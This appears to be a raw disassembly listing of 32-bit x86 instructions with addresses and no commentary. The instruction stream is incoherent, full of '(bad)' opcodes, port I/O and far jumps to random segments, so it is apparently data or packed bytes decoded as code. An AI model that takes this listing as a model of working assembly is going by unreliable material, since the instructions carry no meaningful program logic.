  41195b:	jbe    0x4119a5
  41195d:	add    esi,DWORD PTR [ebp+esi*1-0x2480d6ec]
  411964:	imul   ebp,DWORD PTR [ebp-0x43],0x18a70cc3
  41196b:	pop    DWORD PTR [ebx+0x7a]
  41196e:	jg     0x4119a4
  411970:	outs   dx,DWORD PTR ds:[esi]
  411971:	inc    esp
  411972:	and    DWORD PTR [ebp-0x6c],0xffffffbf
  411976:	lock fcmovnu st,st(0)
  411979:	mov    al,ds:0x8199e0d5
  41197e:	sar    DWORD PTR [eax],1
  411980:	test   BYTE PTR [esi+0x39ea1e00],0x52
  411987:	xor    BYTE PTR [edi+0x71eb5483],bl
  41198d:	or     BYTE PTR [esp+edi*8+0x525a5989],0xcd
  411995:	ficom  WORD PTR [ebp+0x19e9135a]
  41199b:	test   eax,0x8c38ce6d
  4119a0:	push   0x55d59b92
  4119a5:	adc    al,0x99
  4119a7:	jns    0x41196b
  4119a9:	aaa    
  4119aa:	and    DWORD PTR [ebp-0x6b],esp
  4119ad:	push   ebx
  4119ae:	push   ds
  4119af:	clc    
  4119b0:	mov    ch,0x23
  4119b2:	jne    0x4119e5
  4119b4:	sbb    dh,BYTE PTR [ecx]
  4119b6:	leave  
  4119b7:	add    DWORD PTR [edi-0x2e65523e],ebx
  4119bd:	dec    ebp
  4119be:	push   eax
  4119bf:	aad    0x90
  4119c1:	xchg   esp,eax
  4119c2:	or     al,BYTE PTR [ebp+0x263fbf70]
  4119c8:	xchg   edi,eax
  4119c9:	test   al,0xd5
  4119cb:	je     0x41196b
  4119cd:	xchg   ch,ch
  4119cf:	aaa    
  4119d0:	add    BYTE PTR [eax*1-0x19657e0d],dl
  4119d7:	mov    eax,ds:0xa21838a9
  4119dc:	mov    dh,0x69
  4119de:	pop    ebx
  4119df:	lods   eax,DWORD PTR ds:[esi]
  4119e0:	sar    BYTE PTR [edi+edx*1+0x2c85421f],0x7a
  4119e8:	jecxz  0x4119fc
  4119ea:	jmp    0x9b7d:0x586106cd
  4119f1:	shr    BYTE PTR [ebx],0xe6
  4119f4:	fisttp DWORD PTR [ebx+edi*8]
  4119f7:	ss dec ecx
  4119f9:	push   es
  4119fa:	pop    ss
  4119fb:	out    0x3,al
  4119fd:	pop    esp
  4119fe:	bound  edx,QWORD PTR [ebx]
  411a00:	in     al,0x5
  411a02:	stos   DWORD PTR es:[edi],eax
  411a03:	icebp  
  411a04:	div    BYTE PTR [eax+esi*2+0x40fc3340]
  411a0b:	int    0xe8
  411a0d:	mov    edi,0x96e6f002
  411a12:	cld    
  411a13:	ins    DWORD PTR es:[edi],dx
  411a14:	fisubr DWORD PTR [eax+0x30]
  411a17:	(bad)  
  411a19:	sub    al,0x70
  411a1b:	jno    0x411a06
  411a1d:	jb     0x411a3f
  411a1f:	adc    eax,0x4557d4ee
  411a24:	or     DWORD PTR [ecx],ebx
  411a26:	imul   edi,DWORD PTR [edi-0x35ab0ddb],0x16
  411a2d:	int    0xc3
  411a2f:	rol    BYTE PTR [ebp+0x9181e30],1
  411a35:	jns    0x411a9c
  411a37:	into   
  411a38:	xchg   DWORD PTR [edx],edi
  411a3a:	xor    ebx,DWORD PTR [ebx+eax*1+0x6f7ba180]
  411a41:	lea    edi,[ebp+0x13]
  411a44:	pop    edi
  411a45:	or     eax,0x5e4cb599
  411a4a:	adc    BYTE PTR [ebp+ebp*4+0x470f9865],ah
  411a51:	test   al,0x33
  411a53:	pop    ss
  411a54:	push   cs
  411a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a56:	xlat   BYTE PTR ds:[ebx]
  411a57:	lock mov edx,0x534ff6e4
  411a5d:	repnz aad 0x23
  411a60:	dec    ebp
  411a61:	out    0xb9,al
  411a63:	mov    eax,ds:0xfd5e7616
  411a68:	ds inc ebp
  411a6a:	and    al,0xd0
  411a6c:	cdq    
  411a6d:	fs cdq 
  411a6f:	adc    eax,0xb29a84dd
  411a74:	mov    ds:0x543e79b6,al
  411a79:	pop    ds
  411a7a:	sub    esi,esi
  411a7c:	and    esp,DWORD PTR [ebx+0x3b]
  411a7f:	(bad)
  411a82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a83:	mov    eax,ds:0x2509c999
  411a88:	xchg   DWORD PTR [esi-0x32],edi
  411a8b:	pop    edx
  411a8c:	add    esp,DWORD PTR [ebx-0xe]
  411a8f:	fwait
  411a90:	inc    edi
  411a91:	mov    ds:0x3ee8961c,eax
  411a96:	push   edx
  411a97:	or     DWORD PTR [eax],esi
  411a99:	push   ecx
  411a9a:	outs   dx,DWORD PTR ds:[esi]
  411a9b:	push   edi
  411a9c:	iret   
  411a9d:	cwde   
  411a9e:	into   
  411a9f:	pop    ebp
  411aa0:	test   eax,0x7c635851
  411aa5:	adc    ah,dh
  411aa7:	sbb    dl,BYTE PTR [ecx-0x3d]
  411aaa:	es rcl dl,0x35
  411aae:	retf   
  411aaf:	cmp    al,0x53
  411ab1:	pop    ecx
  411ab2:	mov    BYTE PTR ds:[edi-0x4919aa85],al
  411ab9:	sbb    ecx,DWORD PTR [esi+ecx*4]
  411abc:	jb     0x411ac9
  411abe:	ins    BYTE PTR es:[edi],dx
  411abf:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ac1:	hlt    
  411ac2:	ret    0xa527
  411ac5:	ss pop edx
  411ac7:	mov    bl,0x18
  411ac9:	and    al,0xff
  411acb:	mov    esi,0x37336853
  411ad0:	mov    eax,ds:0x794b6d22
  411ad5:	xor    DWORD PTR [esi],esp
  411ad7:	loope  0x411b12
  411ad9:	inc    eax
  411ada:	adc    eax,0x4e23a22b
  411adf:	lods   al,BYTE PTR ds:[esi]
  411ae0:	aad    0x8f
  411ae2:	cwde   
  411ae3:	sahf   
  411ae4:	jno    0x411a9a
  411ae6:	jmp    0x55cdda08
  411aeb:	cdq    
  411aec:	sbb    ecx,DWORD PTR [ebx]
  411aee:	ffree  st(4)
  411af0:	fidiv  DWORD PTR [edi+0x6519275c]
  411af6:	add    eax,0x68e9564c
  411afb:	mov    WORD PTR [ebx+0x2a12ab7a],?
  411b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b02:	out    dx,al
  411b03:	jl     0x411b0f
  411b05:	leave  
  411b06:	mov    ds:0x10666c5f,al
  411b0b:	es jb  0x411a8f
  411b0e:	outs   dx,BYTE PTR ds:[esi]
  411b0f:	sub    eax,0x4173b1d9
  411b14:	jle    0x411b31
  411b16:	mov    ah,0x19
  411b18:	(bad)  
  411b19:	xor    edi,eax
  411b1b:	cld    
  411b1c:	(bad)  
  411b1d:	sbb    eax,0xf7268606
  411b22:	push   esp
  411b23:	sub    al,0x15
  411b25:	aaa    
  411b26:	test   eax,0x9f396a71
  411b2b:	sub    DWORD PTR [edi+0x61b5561b],ecx
  411b31:	inc    ebx
  411b32:	addps  xmm6,XMMWORD PTR [ebx+0x43]
  411b36:	outs   dx,DWORD PTR ds:[esi]
  411b37:	cmp    bl,ah
  411b39:	loope  0x411baf
  411b3b:	outs   dx,BYTE PTR ds:[esi]
  411b3c:	add    esi,edx
  411b3e:	sbb    edx,DWORD PTR [ecx-0x7e]
  411b41:	jge    0x411b40
  411b43:	mov    esi,0xbb88a5ea
  411b48:	add    BYTE PTR [edi+0x473ec041],al
  411b4e:	jae    0x411b40
  411b50:	daa    
  411b51:	sub    ebp,DWORD PTR ds:0x55ba072b
  411b57:	dec    edx
  411b58:	in     al,0x3d
  411b5a:	fcomp  st(5)
  411b5c:	gs fs mov ecx,0x26c17a3a
  411b63:	adc    ecx,edi
  411b65:	in     al,dx
  411b66:	dec    edx
  411b67:	push   0x456c6456
  411b6c:	mov    ecx,0xd599dd6d
  411b71:	dec    ebp
  411b72:	(bad)  
  411b73:	mov    cl,0x12
  411b75:	lahf   
  411b76:	fidivr WORD PTR [esi-0x46]
  411b79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b7a:	fbstp  TBYTE PTR [ecx+0x9]
  411b7d:	daa    
  411b7e:	jl     0x411b12
  411b80:	sub    ah,bh
  411b82:	inc    esp
  411b83:	jecxz  0x411b18
  411b85:	repnz add BYTE PTR [eax],0x80
  411b89:	sbb    eax,0x604a02bd
  411b8e:	retf   
  411b8f:	fist   DWORD PTR [ecx+esi*4+0x627fd075]
  411b96:	pop    ebp
  411b97:	sbb    DWORD PTR [edi-0x30],ebp
  411b9a:	mov    eax,0x9ec94572
  411b9f:	(bad)  
  411ba1:	xor    cl,BYTE PTR [edi+0x3b]
  411ba4:	(bad)  
  411ba5:	cs dec ebp
  411ba7:	dec    ebx
  411ba8:	push   0x66
  411baa:	mov    al,ds:0xdf89aa2f
  411baf:	cmp    eax,0xf59bec75
  411bb4:	and    eax,0x728af758
  411bb9:	iret   
  411bba:	add    BYTE PTR [edx],bl
  411bbc:	pop    ss
  411bbd:	jae    0x411b7e
  411bbf:	add    cl,BYTE PTR [ecx-0x4d]
  411bc2:	lock dec eax
  411bc4:	push   ds
  411bc5:	pusha  
  411bc6:	push   ebp
  411bc7:	xchg   edi,eax
  411bc8:	cwde   
  411bc9:	sbb    ah,bl
  411bcb:	or     DWORD PTR [ebp+0x41148738],eax
  411bd1:	push   edi
  411bd2:	xlat   BYTE PTR ds:[ebx]
  411bd3:	or     BYTE PTR [edx+0x8],ah
  411bd6:	cld    
  411bd7:	or     DWORD PTR [edi],edi
  411bd9:	mov    ds:0x4ce801b3,eax
  411bde:	(bad)  
  411bdf:	(bad)  
  411be0:	out    0x76,eax
  411be2:	into   
  411be3:	outs   dx,BYTE PTR ds:[esi]
  411be4:	jmp    0x411c38
  411be6:	ror    eax,1
  411be8:	retf   0xb128
  411beb:	ja     0x411bd6
  411bed:	or     ebx,esp
  411bef:	xchg   esp,eax
  411bf0:	pop    ebp
  411bf1:	xchg   DWORD PTR [ecx+0x1a53cba1],eax
  411bf7:	xchg   BYTE PTR [ebp-0x1d],dl
  411bfa:	xchg   esi,eax
  411bfb:	fs mov eax,0x4dbc7298
  411c01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c02:	mov    eax,0x8748656d
  411c07:	sti    
  411c08:	in     eax,0x6e
  411c0a:	mov    dh,0xf1
  411c0c:	and    eax,0x92ce90d6
  411c11:	xchg   edx,eax
  411c12:	icebp  
  411c13:	sbb    BYTE PTR [esi],ah
  411c15:	xor    DWORD PTR [ebx],eax
  411c17:	adc    esi,DWORD PTR [edi+eiz*1-0x4f1e14fc]
  411c1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c1f:	push   0xfffffffd
  411c21:	iret   
  411c22:	or     bl,BYTE PTR [ebx+0x3a]
  411c25:	xchg   DWORD PTR [edi+0x4970f71d],edx
  411c2b:	xor    eax,0x66
  411c2e:	(bad)  
  411c2f:	push   edi
  411c30:	xor    dl,BYTE PTR [ecx-0x3f]
  411c33:	repnz push ss
  411c35:	xchg   edx,eax
  411c36:	push   ebx
  411c37:	push   cs
  411c38:	push   edi
  411c39:	mov    ds:0xf08616e,eax
  411c3e:	sub    BYTE PTR [edi-0x212d1619],0x5c
  411c45:	xor    BYTE PTR [ebx+0x11065336],dh
  411c4b:	mov    ch,0x96
  411c4d:	mov    dh,0xc0
  411c4f:	(bad)  
  411c50:	and    edi,0xffffffb9
  411c53:	idiv   DWORD PTR [ecx+eax*1+0x361183dc]
  411c5a:	icebp  
  411c5b:	sbb    eax,0xe7658580
  411c60:	jp     0x411c87
  411c62:	addr16 pusha 
  411c64:	mov    ch,0x31
  411c66:	or     ebx,DWORD PTR [esi-0x14]
  411c69:	ficomp WORD PTR [edi-0x3a]
  411c6c:	inc    ebp
  411c6d:	nop
  411c6e:	icebp  
  411c6f:	popf   
  411c70:	pop    ebx
  411c71:	inc    edi
  411c72:	stos   BYTE PTR es:[edi],al
  411c73:	es out 0x57,al
  411c76:	pop    es
  411c77:	hlt    
  411c78:	mov    ds:0xe6515542,eax
  411c7d:	cmp    dl,dh
  411c7f:	lds    esi,FWORD PTR [esp+esi*8+0x49]
  411c83:	out    dx,eax
  411c84:	test   BYTE PTR [esp+eiz*8+0x1e99a937],cl
  411c8b:	je     0x411ce2
  411c8d:	retf   0x9977
  411c90:	inc    ebp
  411c91:	fild   QWORD PTR [ecx-0x33]
  411c94:	push   ebp
  411c95:	cmp    eax,0x7352c210
  411c9a:	dec    esi
  411c9b:	lods   al,BYTE PTR fs:[esi]
  411c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c9e:	xor    BYTE PTR ss:[ebp+0x3126d02f],bl
  411ca5:	stos   DWORD PTR es:[edi],eax
  411ca6:	or     al,0xeb
  411ca8:	mov    WORD PTR [ecx],ds
  411caa:	sahf   
  411cab:	das    
  411cac:	mov    BYTE PTR [esi-0x7b3f8f71],dh
  411cb2:	push   cs
  411cb3:	and    al,0xde
  411cb5:	add    al,BYTE PTR gs:[eax-0x78efc7c2]
  411cbc:	push   eax
  411cbd:	jecxz  0x411c8c
  411cbf:	pop    es
  411cc0:	ss jns 0x411ca5
  411cc3:	sub    eax,0xdfff1183
  411cc8:	fwait
  411cc9:	test   al,0x38
  411ccb:	pop    esi
  411ccc:	mov    dl,0x83
  411cce:	sahf   
  411ccf:	mov    ah,0xfc
  411cd1:	test   eax,0x66ad1844
  411cd6:	(bad)  [edx]
  411cd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cd9:	push   edx
  411cda:	int    0x1
  411cdc:	fcomip st,st(7)
  411cde:	cmp    DWORD PTR ds:0xca6ee7ad,0x8
  411ce5:	sbb    DWORD PTR [edi+0x63b31446],esp
  411ceb:	mov    WORD PTR [esi+0x2b],cs
  411cee:	pusha  
  411cef:	dec    esi
  411cf0:	adc    al,0xd9
  411cf2:	jmp    FWORD PTR [ecx+0x4f451505]
  411cf8:	(bad)  
  411cfa:	push   eax
  411cfb:	fistp  WORD PTR [ebx-0x1ab44e89]
  411d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d02:	and    DWORD PTR [esi],eax
  411d04:	push   ebp
  411d05:	mov    bl,0x3f
  411d07:	and    edi,ebx
  411d09:	inc    ecx
  411d0a:	jb     0x411d3f
  411d0c:	gs mov dl,bh
  411d0f:	push   ebp
  411d10:	test   eax,0x8bf82ad6
  411d15:	cmp    eax,0x3b44aedd
  411d1a:	mov    al,0x97
  411d1c:	pop    esi
  411d1d:	xor    dl,BYTE PTR [edx]
  411d1f:	sbb    DWORD PTR [edi+eiz*4],ecx
  411d22:	mov    ch,0x95
  411d24:	fisttp QWORD PTR [edi+0x6a]
  411d27:	lock mov esi,0x2e42b38e
  411d2d:	cmp    DWORD PTR [edi],edi
  411d2f:	jmp    0xe822:0xee8a751c
  411d36:	dec    esi
  411d37:	or     bh,BYTE PTR [ecx+0x60fa9cff]
  411d3d:	fisttp WORD PTR [esp+edi*8+0x5ebab5fa]
  411d44:	cdq    
  411d45:	pop    eax
  411d46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d47:	cmp    eax,0x93b24432
  411d4c:	dec    eax
  411d4d:	sbb    al,0x89
  411d4f:	fidiv  DWORD PTR [eax+0x6fa7eb3e]
  411d55:	sahf   
  411d56:	inc    ecx
  411d57:	ficom  WORD PTR [ecx-0x220070d3]
  411d5d:	test   al,0x17
  411d5f:	sbb    esp,DWORD PTR [esi+0x7b]
  411d62:	mov    cl,0xde
  411d64:	dec    eax
  411d65:	jmp    0xf97b507c
  411d6a:	or     eax,0x7ccf836
  411d6f:	jae    0x411d96
  411d71:	and    ch,cl
  411d73:	or     BYTE PTR [eax],dl
  411d75:	sub    ebx,DWORD PTR [eax+0x26592c2e]
  411d7b:	out    dx,al
  411d7c:	aam    0x24
  411d7e:	xchg   edi,eax
  411d7f:	scas   eax,DWORD PTR es:[edi]
  411d80:	test   BYTE PTR [edi+0x6f],bl
  411d83:	sub    DWORD PTR [ebx-0x66],0xe8fb0681
  411d8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d8b:	fist   DWORD PTR [edx-0x76]
  411d8e:	mov    ebp,?
  411d90:	pop    esp
  411d91:	mov    al,ds:0x6db24584
  411d96:	adc    ebp,DWORD PTR [ecx-0x5b]
  411d99:	xor    al,0xe
  411d9b:	pop    ebx
  411d9c:	pop    edi
  411d9d:	stos   BYTE PTR es:[edi],al
  411d9e:	push   ebp
  411d9f:	push   0x5e09bf07
  411da4:	or     al,0x24
  411da7:	push   ecx
  411da8:	test   al,0x9c
  411daa:	loop   0x411d34
  411dac:	cmp    bl,BYTE PTR [ebx-0x362791be]
  411db2:	pushf  
  411db3:	sub    al,0xad
  411db5:	or     al,0x46
  411db7:	je     0x411de6
  411db9:	arpl   sp,sp
  411dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dbc:	mov    esi,0xccd550d3
  411dc1:	and    DWORD PTR [ebx+0x4869d5e3],0xdf6b1330
  411dcb:	dec    eax
  411dcc:	mov    edx,0x92444e92
  411dd1:	(bad)  
  411dd2:	and    al,0xe1
  411dd4:	ret    
  411dd5:	int3   
  411dd6:	ins    BYTE PTR es:[edi],dx
  411dd7:	popf   
  411dd8:	push   edx
  411dd9:	mov    ebx,0x64dade8e
  411dde:	sub    ch,BYTE PTR [edi-0x7f522965]
  411de4:	push   ds
  411de5:	inc    esi
  411de6:	(bad)  
  411de7:	aam    0xfb
  411de9:	pop    edx
  411dea:	and    eax,0x2ae36165
  411def:	xchg   edx,eax
  411df0:	or     eax,0x60222452
  411df5:	daa    
  411df6:	sahf   
  411df7:	(bad)  
  411df8:	out    dx,eax
  411df9:	and    al,0x87
  411dfb:	adc    edx,DWORD PTR ds:0x6fecbe23
  411e01:	std    
  411e02:	ror    DWORD PTR [esi-0x54536bfc],1
  411e08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e09:	imul   edi,DWORD PTR [esi-0x56],0x73
  411e0d:	mov    edx,eax
  411e0f:	pusha  
  411e10:	cmp    al,0x49
  411e12:	push   edx
  411e13:	adc    BYTE PTR [ebx+edx*8+0x19],0x42
  411e18:	mov    ecx,0x58076391
  411e1d:	stos   BYTE PTR es:[edi],al
  411e1e:	rcr    BYTE PTR fs:[ecx],1
  411e21:	adc    ch,BYTE PTR [ecx+0x61]
  411e24:	pop    ds
  411e25:	sbb    eax,0xb7752bd2
  411e2a:	sahf   
  411e2b:	jne    0x411e0c
  411e2d:	loope  0x411e90
  411e2f:	int    0xa2
  411e31:	inc    esi
  411e32:	inc    ecx
  411e33:	aam    0x82
  411e35:	lods   eax,DWORD PTR ds:[esi]
  411e36:	mov    BYTE PTR [ecx-0x48],bh
  411e39:	scas   eax,DWORD PTR es:[edi]
  411e3a:	in     eax,dx
  411e3b:	test   DWORD PTR [eax+0x595e1211],ebp
  411e41:	cwde   
  411e42:	add    eax,0xf417d619
  411e47:	jmp    0xd518:0xa4823b96
  411e4e:	inc    edi
  411e4f:	ins    BYTE PTR es:[edi],dx
  411e50:	xchg   esp,eax
  411e51:	std    
  411e52:	and    eax,DWORD PTR [esi]
  411e54:	cmp    ebx,edi
  411e56:	call   0x94cd:0xd8f74de
  411e5d:	repnz and al,0xb5
  411e60:	xchg   DWORD PTR [edx],eax
  411e62:	push   esi
  411e63:	xor    DWORD PTR [ebp-0x72a1cbce],0xffffffd8
  411e6a:	and    al,0x73
  411e6c:	in     al,0xa3
  411e6e:	lahf   
  411e6f:	fsub   DWORD PTR [ecx]
  411e71:	lods   al,BYTE PTR ds:[esi]
  411e72:	adc    al,0xe1
  411e74:	jecxz  0x411e72
  411e76:	jb     0x411ee5
  411e78:	dec    edi
  411e79:	dec    ebp
  411e7a:	adc    bl,dh
  411e7c:	or     DWORD PTR [edi-0xb94eb5e],esp
  411e82:	push   ss
  411e83:	enter  0x8606,0x74
  411e87:	or     BYTE PTR [edi-0x557e230],bh
  411e8d:	adc    al,0x6b
  411e8f:	cmp    eax,0x6a7caaf4
  411e94:	adc    dh,cl
  411e96:	fidivr DWORD PTR [eax+0x76]
  411e99:	and    edi,DWORD PTR [esi-0x45c9fa7a]
  411e9f:	push   0xffffffe5
  411ea1:	ret    0x1f5c
  411ea4:	(bad)  
  411ea5:	mov    ds:0x204a1173,eax
  411eaa:	fadd   QWORD PTR [ebx-0x5d]
  411ead:	int3   
  411eae:	test   DWORD PTR [esi],ebp
  411eb0:	sub    eax,0x2dc4b941
  411eb5:	and    BYTE PTR [ecx],dh
  411eb7:	loop   0x411e93
  411eb9:	cmc    
  411eba:	js     0x411f38
  411ebc:	dec    edx
  411ebd:	pop    edx
  411ebe:	pop    esi
  411ebf:	cmp    cl,0xa7
  411ec2:	mov    ch,0xe0
  411ec4:	sti    
  411ec5:	xor    eax,0x7d3f0cfe
  411eca:	xor    BYTE PTR [edi-0x60],dh
  411ecd:	fbld   TBYTE PTR [ecx+0x65152f0a]
  411ed3:	in     al,dx
  411ed4:	sbb    BYTE PTR [ebp+0x7],0x64
  411ed8:	lock lahf 
  411eda:	xor    dl,ch
  411edc:	test   eax,0xd443d9b0
  411ee1:	fistp  WORD PTR [ecx+0x24]
  411ee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ee5:	aas    
  411ee6:	(bad)  
  411ee7:	(bad)  
  411ee8:	pop    ss
  411ee9:	sbb    BYTE PTR [edi],al
  411eeb:	div    esp
  411eed:	mov    DWORD PTR [esp+eiz*4-0x54],esp
  411ef1:	aas    
  411ef2:	fsub   st,st(5)
  411ef4:	and    BYTE PTR [eax+0x72],0x37
  411ef8:	or     eax,0x3bb1aefc
  411efd:	push   ecx
  411efe:	pop    ebx
  411eff:	dec    ebx
  411f00:	dec    esi
  411f01:	pop    esp
  411f02:	mov    edi,0xc870b053
  411f07:	jno    0x411f86
  411f09:	test   eax,0x850f78e
  411f0e:	int3   
  411f0f:	and    eax,0x81e639e1
  411f14:	dec    ebp
  411f15:	mov    edx,0x168d0464
  411f1a:	and    ch,BYTE PTR [ebp+0x49]
  411f1d:	cwde   
  411f1e:	xor    esp,DWORD PTR [ebx]
  411f20:	popf   
  411f21:	mov    BYTE PTR [edi],0xf8
  411f24:	jle    0x411f5b
  411f26:	into   
  411f27:	mov    bh,0xd0
  411f29:	daa    
  411f2a:	fidivr DWORD PTR [eax-0x278a4602]
  411f30:	ss push cs
  411f32:	(bad)  
  411f33:	imul   BYTE PTR [edx+0x42955bff]
  411f39:	ins    BYTE PTR es:[edi],dx
  411f3a:	jg     0x411fb2
  411f3c:	xchg   esi,ecx
  411f3e:	and    eax,0xe448a634
  411f43:	push   ebp
  411f44:	dec    eax
  411f45:	xchg   ebx,eax
  411f46:	addr16 ror ebp,cl
  411f49:	cli    
  411f4a:	or     edx,DWORD PTR [ebp+0x54]
  411f4d:	nop
  411f4e:	mov    edi,0xa4692bf5
  411f53:	jne    0x411ee6
  411f55:	or     DWORD PTR [edi],0x47031399
  411f5b:	mov    dh,0x12
  411f5d:	bound  edi,QWORD PTR [esp+edx*4-0x67]
  411f61:	mov    cl,0x9
  411f63:	inc    esp
  411f64:	sti    
  411f65:	push   ebx
  411f66:	out    0x73,eax
  411f68:	dec    edx
  411f69:	xor    DWORD PTR [edx],0x2d
  411f6c:	sub    DWORD PTR [edi+0x3cee2ef6],ebx
  411f72:	xchg   ecx,eax
  411f73:	ret    
  411f74:	mov    edi,0xda4838c2
  411f79:	gs sub eax,0x4e3fc162
  411f7f:	mov    esp,0x52427b24
  411f84:	dec    ecx
  411f85:	xor    DWORD PTR [ebx-0x492899f0],ecx
  411f8b:	inc    esi
  411f8c:	xor    edi,DWORD PTR [eax*1+0x58e60981]
  411f93:	add    eax,0x11c6cb16
  411f98:	mov    ebp,0x619d075b
  411f9d:	push   esp
  411f9e:	mov    edi,0x461673d3
  411fa3:	cmp    bl,bh
  411fa5:	loope  0x411fcf
  411fa7:	into   
  411fa8:	push   ebx
  411fa9:	jbe    0x411f86
  411fab:	popa   
  411fac:	jg     0x41200d
  411fae:	ror    BYTE PTR [ebx+0x79],1
  411fb1:	mov    ecx,0x4d9a6338
  411fb6:	cmc    
  411fb7:	cmp    ebp,DWORD PTR [ecx-0x1ab627c0]
  411fbd:	add    bl,cl
  411fbf:	out    0xd,eax
  411fc1:	jmp    0x411f5a
  411fc3:	dec    DWORD PTR [ebx+ecx*4-0x43]
  411fc7:	(bad)  
  411fc8:	pop    esi
  411fc9:	int3   
  411fca:	jle    0x411fb5
  411fcc:	mov    bh,BYTE PTR [ebp+0x3d]
  411fcf:	das    
  411fd0:	xor    al,0xc5
  411fd2:	sub    al,0x1c
  411fd4:	pop    edx
  411fd5:	test   DWORD PTR [ebp-0x3a],edi
  411fd8:	pop    edi
  411fd9:	xchg   edx,eax
  411fda:	jno    0x411fcb
  411fdc:	dec    esi
  411fdd:	xchg   edi,eax
  411fde:	inc    eax
  411fdf:	(bad)  
  411fe0:	cmp    esi,DWORD PTR [edx]
  411fe2:	shl    BYTE PTR [ecx-0x6576e402],cl
  411fe8:	and    eax,0x966b23
  411fed:	jle    0x411f70
  411fef:	dec    eax
  411ff0:	in     al,0x3c
  411ff2:	repnz shr BYTE PTR ds:0x4fbc0616,0xf5
  411ffa:	ja     0x411ffd
  411ffc:	mov    bh,0x4a
  411ffe:	dec    ebp
  411fff:	push   eax
  412000:	push   ebp
  412001:	in     eax,0x7a
  412003:	in     eax,dx
  412004:	dec    esp
  412005:	mov    al,ds:0x7a4e378c
  41200a:	in     al,dx
  41200b:	pop    ebx
  41200c:	(bad)  
  41200d:	fadd   DWORD PTR ds:0x17e0a227
  412013:	pop    ebx
  412014:	mov    al,ds:0xd44e47af
  412019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41201a:	clc    
  41201b:	mov    ?,ebx
  41201d:	scas   eax,DWORD PTR es:[edi]
  41201e:	and    ebx,DWORD PTR [esi]
  412020:	outs   dx,DWORD PTR ds:[esi]
  412021:	(bad)  
  412022:	mov    ds:0xedc9f5bd,eax
  412027:	xor    al,0xd8
  412029:	cmp    ch,BYTE PTR [eax-0x2efdf966]
  41202f:	adc    eax,DWORD PTR [edi-0x3bf379]
  412035:	fld    DWORD PTR [edi-0x6a]
  412038:	push   edx
  412039:	inc    edx
  41203a:	arpl   cx,bx
  41203c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41203d:	call   0xa3be3432
  412042:	mov    cl,0xb1
  412044:	push   esi
  412045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412046:	pop    edi
  412047:	loop   0x4120af
  412049:	sub    cl,cl
  41204b:	inc    ecx
  41204c:	int    0x15
  41204e:	xchg   bx,ax
  412050:	lods   al,BYTE PTR ds:[esi]
  412051:	lods   al,BYTE PTR ds:[esi]
  412052:	fistp  WORD PTR [eax+0x316c41fd]
  412058:	stos   DWORD PTR es:[edi],eax
  412059:	test   BYTE PTR [eax-0x80],bl
  41205c:	add    bh,bl
  41205e:	cmp    eax,0x833203c1
  412063:	cmp    al,0xac
  412065:	jle    0x411ffb
  412067:	mov    esi,0x89782ed8
  41206c:	mov    BYTE PTR [esi-0x51],bl
  41206f:	jae    0x41201f
  412071:	xchg   bl,bl
  412073:	jne    0x4120d9
  412075:	sbb    eax,esp
  412077:	jns    0x412005
  412079:	sub    DWORD PTR [edx+ebp*1+0x164aefaa],eax
  412080:	aaa    
  412081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412082:	mov    gs,WORD PTR [edx-0x1d]
  412085:	sub    al,0x64
  412087:	ret    0x1495
  41208a:	bound  edx,QWORD PTR [edx]
  41208c:	sti    
  41208d:	xor    ebx,ebp
  41208f:	adc    DWORD PTR [ecx],ebx
  412091:	jmp    FWORD PTR [ebx+ebx*4-0x5c4de64f]
  412098:	retf   0xad13
  41209b:	(bad)  [esi]
  41209d:	shl    BYTE PTR [ecx-0x797f7209],1
  4120a3:	pushf  
  4120a4:	bound  ebx,QWORD PTR [eax+0x2ba21624]
  4120aa:	add    DWORD PTR [ecx-0x7],esi
  4120ad:	or     al,0x4a
  4120af:	jae    0x4120d6
  4120b1:	sbb    eax,0x44cf2c1f
  4120b6:	and    bl,BYTE PTR [ecx+0x6302a0b]
  4120bc:	out    dx,al
  4120bd:	xchg   esp,eax
  4120be:	jne    0x41212a
  4120c0:	adc    eax,0x7e815de0
  4120c5:	xchg   ebx,eax
  4120c6:	jnp    0x412138
  4120c8:	mov    dh,0x65
  4120ca:	fidiv  WORD PTR [eax+eax*1]
  4120cd:	mov    dh,0x7
  4120cf:	mov    WORD PTR [ebx],ds
  4120d1:	arpl   di,dx
  4120d3:	clc    
  4120d4:	lahf   
  4120d5:	fild   WORD PTR ds:0xeb9faefe
  4120db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120dc:	loopne 0x4120bb
  4120de:	aas    
  4120df:	ror    BYTE PTR [edi+0x54],1
  4120e2:	lods   eax,DWORD PTR ds:[esi]
  4120e3:	dec    eax
  4120e4:	jmp    0x412162
  4120e6:	push   0x77
  4120e8:	adc    eax,0x8584b86c
  4120ed:	stos   BYTE PTR es:[edi],al
  4120ee:	mov    esp,0x1b77485c
  4120f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120f4:	scas   eax,DWORD PTR es:[edi]
  4120f5:	stos   BYTE PTR es:[edi],al
  4120f6:	adc    cl,BYTE PTR [ebx]
  4120f8:	mov    eax,0x4764326
  4120fd:	ss jae 0x4120c2
  412100:	cmp    esi,DWORD PTR [edx+esi*4+0x2d]
  412104:	lods   eax,DWORD PTR ds:[esi]
  412105:	fdivr  st,st(6)
  412107:	sbb    BYTE PTR [eax+0x4a],cl
  41210a:	inc    edi
  41210b:	ffree  st(3)
